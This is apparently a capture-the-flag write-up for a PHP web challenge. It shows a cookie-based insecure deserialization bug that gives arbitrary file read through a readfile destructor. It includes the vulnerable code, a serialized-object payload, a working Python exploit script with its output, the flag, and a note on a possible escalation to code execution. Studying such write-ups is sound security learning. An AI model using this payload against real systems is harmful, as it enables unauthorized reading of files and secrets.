# Not PHP2Shell

**Category:** web
**Flag:** `SkillBit{p4tch3d_php_bu7_wh4t_4b0u7_th3_c0d3}`

## The challenge

> PHP2Shell is making headlines, and everyone's asking the same question: "Are we vulnerable?"
>
> Not here! We've patched our runtime, reviewed our configuration, and built this lovely little advisory center to help you sleep better at night. We are happy to remind you that everything is under control.

There is no source bundle on this one, just the URL of a PHP advisory site. The joke in the name is that the bug does not need PHP2Shell at all. The runtime is patched; the application code is still the problem.

## Looking at the app

The site is a small knowledgebase. Each article is a slug, and the article list lives in a `KB_ARTICLES` const inside `index.php` mapping slugs to HTML fragments on disk. Nothing user-controlled there.

The interesting part is how the app remembers which article you were on. It does not use the URL. It stores the whole page object in a cookie:

```php
function kb_remember($slug) {
 $page = new ArticleModel;
 $page->slug = $slug;
 $page->file = KB_ARTICLES[$slug]['file'];
 setcookie('PHPSESSID', base64_encode(serialize($page)), time + 60*60*24, '/');
 return $page;
}

function kb_open {
 $slug = isset($_GET['a']) ? $_GET['a'] : '';
 if (isset(KB_ARTICLES[$slug])) return kb_remember($slug);
 if (!empty($_COOKIE['PHPSESSID']))
 return unserialize(base64_decode($_COOKIE['PHPSESSID'])); // <-- here
 return kb_remember('overview');
}
```

So `PHPSESSID` is `base64(serialize(ArticleModel))`, and if the slug in the URL is not a known article the app `unserialize`s whatever the client sent. I set the cookie, I choose the object's fields.

The second half is `models/ArticleModel.php`. Its destructor reads `$this->file`:

```php
class ArticleModel {
 public $file;
 public $slug;
 public function __destruct {
 readfile($this->file);
 }
}
```

And `index.php` releases the object on purpose, right after the header partial:

```php
require __DIR__ . '/partials/header.php';
unset($page); // article body is written out as the article object is released
```

`unset` drops the last reference, the destructor fires, and `readfile` prints whatever path I put in `file`. No auth, no path check, no allowlist.

## The payload

Serialise an `ArticleModel` with `file` pointing at the target and a `slug` that is not in `KB_ARTICLES` (so the code path goes through the cookie branch instead of `kb_remember`):

```
O:12:"ArticleModel":2:{s:4:"file";s:N:"<path>";s:4:"slug";s:8:"overview";}
```

`overview` is a real article but the cookie branch never checks it, so any value works; the article body is only used for the nav highlight. Base64 the string, send it as `PHPSESSID`, and the article fragment comes back with the `readfile` output spliced into the page.

```python
#!/usr/bin/env python3
import base64, ssl, urllib.request, re, sys

ctx = ssl.create_default_context
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
HOST = "https://e89b09dc80a6ac10.live.sbhost.io/"

def readfile(path):
 obj = 'O:12:"ArticleModel":2:{s:4:"file";s:%d:"%s";s:4:"slug";s:8:"overview";}' % (len(path), path)
 c = base64.b64encode(obj.encode).decode
 req = urllib.request.Request(HOST, headers={"Cookie": "PHPSESSID=" + c})
 h = urllib.request.urlopen(req, context=ctx, timeout=25).read.decode("utf-8", "replace")
 m = re.search(r'<article class="doc" id="article"[^>]*>(.*?)</article>', h, flags=re.S)
 return m.group(1) if m else h

for p in sys.argv[1:]:
 print("========", p, "========")
 print(readfile(p)[:3000])
```

Start with the file the app already reads, to confirm the primitive:

```
$ python3 rf.py /www/pages/overview.html
======== /www/pages/overview.html ========
<p>...the real overview text...</p>
```

Then read something outside the webroot. The flag sits at `/flag.txt`, owned `root:www-data` mode 0640, readable by the php-fpm worker:

```
$ python3 rf.py /flag.txt
======== /flag.txt ========
SkillBit{p4tch3d_php_bu7_wh4t_4b0u7_th3_c0d3}
```

## Flag

```
SkillBit{p4tch3d_php_bu7_wh4t_4b0u7_th3_c0d3}
```

## Notes

The "patched runtime" framing is the misdirection. The advisory site talks you into auditing the PHP build and the config directives, and the `kb_deployment` panel even shows a `patched: true` for the running branch. None of that is where the bug is. The bug is six lines of application code: an object with a `readfile` destructor, a client-supplied serialised object, and a deliberate `unset` to force the destructor to run.

Two things made this quick to spot once I had `index.php`. The `unserialize(base64_decode($_COOKIE[...]))` on an attacker-controlled cookie is the whole primitive, and `unset($page)` with that comment is the author telling you the destructor is going to fire. When you see an object stored in a cookie and a magic method that touches the filesystem, you do not need a gadget chain. You just write the field.

One extra surface I did not need but worth noting: `index.php` registers an autoloader that builds `include_once __DIR__ . "/models/$name.php"` (or `__DIR__ . "/$name.php"`) from any unserialised class name ending in `Model`. That is a class-name-controlled include, so if there were any writable file whose name you control, this would escalate from arbitrary read to code execution. The file read is enough for the flag, so I stopped there.
